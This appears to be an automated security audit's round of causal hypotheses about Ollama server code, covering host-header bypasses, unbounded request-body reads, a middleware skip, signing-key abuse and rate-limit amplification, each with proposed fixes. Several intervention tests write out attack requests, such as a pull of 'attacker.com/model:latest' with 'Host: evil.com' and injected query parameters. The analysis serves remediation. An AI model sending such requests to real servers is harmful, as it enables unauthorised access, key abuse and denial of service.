# Round 3 Hypotheses — Causal Verifier (Counterfactual / Intervention Analysis)

## PH-17: Causal — Removing non-loopback short-circuit would break all LAN deployments that currently rely on it (Counterfactual confirms gap is structural)

**Source**: CROSS-01 (host bypass chain), PH-10
**Causal question**: If `allowedHostsMiddleware` removed the `!addr.Addr().IsLoopback()` early-return, would legitimate LAN use cases break?
**Counterfactual analysis**: A LAN operator using `OLLAMA_HOST=0.0.0.0` with clients accessing via `http://192.168.1.50:11434` — the client's Host header would be `192.168.1.50`. Under the current `IsPrivate()` branch (routes.go:1626), this would still be accepted. However, if `IsPrivate()` were also removed (the recommended fix), clients using LAN IPs as Host headers would get 403. Legitimate clients using `http://ollama-host.local:11434` would pass via `.local` suffix check. Conclusion: the loopback short-circuit is NOT needed for LAN access; it is a design shortcut that eliminates security for no functional benefit when combined with the other allow paths.
**Intervention test**: Set `OLLAMA_HOST=0.0.0.0`; send `POST /api/generate` with `Host: 0.0.0.0` → currently accepted (IsUnspecified). With loopback short-circuit removed but `IsUnspecified` preserved, still accepted. The short-circuit removal alone does not break any legitimate path — it just removes the "accept anything on non-loopback bind" bypass.
**Causal verdict**: The non-loopback short-circuit is a SUFFICIENT cause of the DNS rebinding exposure on LAN deployments. Its removal (with retention of the IsPrivate/IsUnspecified/isLocalIP sub-checks) would close G1 without breaking legitimate LAN access patterns.
**Severity**: HIGH — confirmed causal relationship
**Evidence**: routes.go:1615-1618 (the short-circuit); routes.go:1625-1629 (the IP allow paths that survive removal)

---

## PH-18: Causal — `readRequestBody` Size Limit is Missing; Adding `http.MaxBytesReader` Would Contain OOM

**Source**: CROSS-02, PH-01, PH-02, PH-14, PH-15
**Causal question**: Is `io.ReadAll(r.Body)` in `readRequestBody` the proximate cause of the OOM, or is there a downstream limit that prevents memory exhaustion?
**Counterfactual analysis**: Go's `net/http` server does not impose a default request body size limit. gin does not impose one either. `c.ShouldBindJSON` uses `json.NewDecoder` which streams without a limit. The only existing limit is the zstd branch's `http.MaxBytesReader(20MB)` at cloud_proxy.go:88-89, which is not reachable for non-zstd bodies.
**Intervention test**: Replace `io.ReadAll(r.Body)` in `readRequestBody` with `io.ReadAll(http.MaxBytesReader(nil, r.Body, maxDecompressedBodySize))` — this would cause `readRequestBody` to return an error for bodies >20MB. Verify that callers handle the error correctly (all callers check `err != nil` from `readRequestBody`; cloud_proxy.go:96-100 returns `http.StatusBadRequest` on error).
**Causal verdict**: `readRequestBody`'s unbounded `io.ReadAll` is the direct cause of OOM for non-zstd bodies. The fix is localized to a single function and would close PH-01, PH-02, PH-14, and PH-15 simultaneously.
**Severity**: HIGH — confirmed causal chain from `readRequestBody` to heap exhaustion
**Evidence**: cloud_proxy.go:289-301 (readRequestBody); cloud_proxy.go:80-101 (asymmetric limit); middleware/openai.go:511-523 (ResponsesMiddleware unbounded JSON read)

---

## PH-19: Causal — client2 `/api/pull` bypass is contingent on `OLLAMA_EXPERIMENT=client2`; risk is real but gated

**Source**: CROSS-03, PH-03, PH-11
**Causal question**: How exploitable is the client2 middleware skip in practice?
**Counterfactual analysis**: `useClient2 = experimentEnabled("client2")` at routes.go:95 — only true when `OLLAMA_EXPERIMENT=client2` is in the environment at server startup. This is not a default. However: (a) the experiment is enabled for testing by Ollama developers and in any automated test environment that sets this variable; (b) documentation does not list security implications of enabling this experiment; (c) the condition is evaluated at package init time (`var useClient2 = experimentEnabled("client2")`), so it's a static decision at startup — but the attack window is the entire server lifetime once enabled.
**Intervention test**: With `OLLAMA_EXPERIMENT=client2` active, send POST `/api/pull {"model":"attacker.com/model:latest"}` with `Origin: http://evil.com` and `Host: evil.com` — no 403 from `allowedHostsMiddleware` because the gin chain is never invoked. The pull proceeds and issues outbound HTTPS to `attacker.com`. Confirm by checking server logs for the outbound connection.
**Causal verdict**: The causal chain is confirmed but gated on the experiment flag. Risk level: HIGH for development/test environments where client2 is routinely enabled; MEDIUM for production (flag not set by default). The severity impact of the gap (complete auth middleware bypass on two endpoints) warrants treating this as HIGH regardless.
**Evidence**: routes.go:95 (flag evaluation); routes.go:1735-1744 (conditional wrap); registry/server.go:114-128 (dispatch before fallback)

---

## PH-20: Causal — web_search/web_fetch signing key abuse requires both host bypass AND unauthenticated route

**Source**: CROSS-01, PH-05
**Causal question**: What is the minimum attack surface needed to abuse the signing key via web_search/web_fetch?
**Counterfactual analysis**: Two causal preconditions must hold simultaneously: (1) the attacker can reach `/api/experimental/web_search` or `/api/experimental/web_fetch`; (2) the route accepts the request without local authentication. Condition (1) is satisfied by any of the host bypass vectors (PH-04, PH-10, PH-12). Condition (2) is unconditionally true — these routes have no auth middleware. If EITHER condition is closed (by adding auth middleware OR by fixing all host bypasses), the attack fails.
**Intervention test (closing condition 2)**: Add a local auth token check to `WebSearchExperimentalHandler` and `WebFetchExperimentalHandler` — verify that without a valid token header, the endpoint returns 401. This is the lower-complexity fix since fixing all host bypass vectors is harder.
**Intervention test (closing condition 1)**: Fix `allowedHostsMiddleware` to enforce host validation regardless of bind address AND replace suffix match with IP-resolution check — verify that `Host: evil.localhost` returns 403.
**Causal verdict**: The signing key abuse is caused by the conjunction of two independently-existing gaps. Each gap has an independent fix. The highest-impact single fix is adding local auth to these two endpoints (closes the attack even if host bypass persists via other means).
**Severity**: HIGH — confirmed two-precondition causal chain
**Evidence**: routes.go:1707-1708 (no auth on web handlers); cloud_proxy.go:360-373 (signing is unconditional for ollama.com target)

---

## PH-21: Causal — RawQuery Forwarding Impact Depends on ollama.com Backend; Not Independently Exploitable

**Source**: PH-08
**Causal question**: Does query parameter injection into ollama.com cause a security-relevant outcome independently of other vulnerabilities?
**Counterfactual analysis**: The `RawQuery` from `c.Request.URL.RawQuery` is appended to the outgoing ollama.com URL. The ollama.com API's response to unexpected query parameters is opaque. Possible outcomes: (a) parameters ignored — no impact; (b) parameters affect rate limiting key — denial-of-service to another key; (c) parameters expose debug output — information leak. Without access to ollama.com internals, the causal chain cannot be confirmed beyond the injection point.
**Intervention test**: Send POST `/v1/chat/completions?model=gpt-5&ts=0` to the local proxy; observe what URL is sent to ollama.com in a test/debug mode. Confirm that `ts=0` from the client coexists with the `ts=<timestamp>` set by `buildCloudSignatureChallenge` at cloud_proxy.go:378-381. If `ts` appears twice in the query, the last value wins in most URL parsers — an attacker could pin the timestamp to 0, potentially replaying signed requests during the same second.
**Causal verdict**: NEEDS-DEEPER. The timestamp collision (attacker provides `?ts=0`, signing adds `&ts=<unix>`) is a concrete testable consequence. If `query.Set("ts", ts)` in `buildCloudSignatureChallenge` sets the ts on the query that was already populated from `c.Request.URL.RawQuery`, the query would contain both `ts=0` and `ts=<real>`. Go's `url.Values.Set` replaces the value, so the signed timestamp wins — but the attacker's `ts=0` was already in `RawQuery` before the signature was built. The signature is over `req.URL.RequestURI()` which includes the final query string. So attacker-supplied parameters appear BEFORE the timestamp in the signed string. Verify whether this ordering matters for ollama.com's signature validation.
**Evidence**: cloud_proxy.go:191-194 (RawQuery copy); cloud_proxy.go:376-382 (signature builds on same URL object)

---

## PH-22: Causal — Anthropic Web Search Loop Is Bounded at 3; Cross-05 Amplification Is Limited

**Source**: CROSS-05, PH-13
**Causal question**: Is the `WebSearchAnthropicWriter` loop actually bounded in a way that limits DoS?
**Counterfactual analysis**: `maxWebSearchLoops = 3` at middleware/anthropic.go:118 is a hard constant. After 3 iterations, the loop exits. Each iteration calls `anthropic.WebSearch` (outbound HTTP to ollama.com) and `w.callFollowUpChat` (local inference or cloud proxy). Memory consumption per iteration is bounded by the response sizes from web search (which are ollama.com-controlled) and the follow-up chat body (which is the original request body plus search results). The original request body was already unboundedly buffered (PH-14 applies to the initial read), but subsequent loop iterations use already-allocated data.
**Causal verdict**: The web_search loop amplification (CROSS-05) is capped at 3 iterations and does not represent a new OOM vector beyond what PH-02/PH-14 already establish for the initial body read. However, the loop does amplify the NUMBER of outbound ollama.com API calls from 1 to up to 4 (1 initial + 3 follow-ups), multiplied by the number of concurrent attackers. This is a rate-limit amplification vector: one attacker request to `/v1/messages` with web_search can generate 4 billable ollama.com API calls against the victim's quota.
**Severity**: MEDIUM (rate limit amplification, not OOM)
**Evidence**: middleware/anthropic.go:118 (`maxWebSearchLoops = 3`); middleware/anthropic.go:244 (loop boundary); middleware/anthropic.go:260 (`anthropic.WebSearch` outbound call per iteration)
